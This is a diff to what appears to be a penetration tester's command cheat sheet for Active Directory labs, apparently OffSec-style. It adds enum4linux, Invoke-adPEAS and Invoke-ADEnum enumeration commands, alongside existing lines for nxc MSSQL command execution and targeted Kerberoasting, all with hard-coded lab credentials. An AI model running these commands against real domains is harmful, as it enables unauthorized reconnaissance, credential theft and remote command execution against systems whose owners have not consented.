@@ -11,6 +11,7 @@ sudo autorecon $ip --subdomain-enum.domain $dom --global.domain $dom
 sudo ntpdate $ip
 
 enum4linux -a $ip
+enum4linux -a -M -l -d $ip 2>&1
 enum4linux -a -u "$dom\\$user" -p "winniethepooh" $ip
 enum4linux -a -u "$dom\\$user" -p "" -M -l -d $ip 2>&1
 
@@ -71,4 +72,6 @@ nxc mssql -d hokkaido-aerospace.com -u discovery -p 'Start123!' -x "whoami" 192.
 source /opt/windows/targetedKerberoast/venv/bin/activate
 python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $ip
 
+Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
+Invoke-ADEnum -AllEnum -Force
 ```
